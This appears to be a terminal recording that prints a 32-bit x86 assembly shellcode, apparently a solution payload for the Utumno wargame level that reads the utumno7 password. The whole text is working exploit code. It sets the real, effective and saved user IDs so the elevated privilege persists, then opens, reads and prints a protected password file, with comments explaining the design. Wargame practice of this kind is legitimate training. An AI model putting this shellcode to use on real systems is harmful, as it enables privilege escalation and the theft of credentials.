[0.000, "o", "BITS 32\r\r\nglobal _start\r\r\n_start:\r\r\n    ; write(1, \"PWN!\", 4) -- marker so the address sweep can tell a hit from a crash\r\r\n    xor eax, eax\r\r\n    push eax\r\r\n    push 0x214e5750\r\r\n    mov ecx, esp\r\r\n    xor ebx, ebx\r\r\n    inc ebx\r\r\n    xor edx, edx\r\r\n    mov dl, 4\r\r\n    mov al, 4\r\r\n    int 0x80\r\r\n    ; euid = geteuid(); setreuid(euid,euid)\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    mov ecx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 70\r\r\n    int 0x80\r\r\n    ; setuid(euid) -- real, effective AND saved, so the privilege survives\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 23\r\r\n    int 0x80\r\r\n    ; \"/etc/utumno_pass/utumno7\" pushed as six little-endian dwords.\r\r\n    ; The shellcode reads the file itself because utumno5's getchar loop has\r\r\n    ; already consumed all of stdin -- a spawned shell would get no commands.\r\r\n    xor eax, eax\r\r\n    push eax                ; NUL terminator\r\r\n    push 0x376f6e6d         ; \"mno7\"\r\r\n    push 0x7574752f         ; \"/utu\"\r\r\n    push 0x73736170         ; \"pass\"\r\r\n    push 0x5f6f6e6d         ; \"mno_\"\r\r\n    push 0x7574752f         ; \"/utu\"\r\r\n    push 0x6374652f         ; \"/etc\"\r\r\n    mov ebx, esp\r\r\n    xor ecx, ecx\r\r\n    xor eax, eax\r\r\n    mov al, 5               ; open(path, O_RDONLY)\r\r\n    int 0x80\r\r\n    ; read(fd, buf, 64)\r\r\n    mov ebx, eax\r\r\n    sub esp, 64\r\r\n    mov ecx, esp\r\r\n    xor edx, edx\r\r\n    mov dl, 64\r\r\n    xor eax, eax\r\r\n    mov al, 3\r\r\n    int 0x80\r\r\n    ; write(1, buf, n)\r\r\n    mov edx, eax\r\r\n    xor ebx, ebx\r\r\n    inc ebx\r\r\n    mov ecx, esp\r\r\n    xor eax, eax\r\r\n    mov al, 4\r\r\n    int 0x80\r\r\n    ; exit(0)\r\r\n    xor eax, eax\r\r\n    inc eax\r\r\n    xor ebx, ebx\r\r\n    int 0x80\r\r\n\r\r\n"]
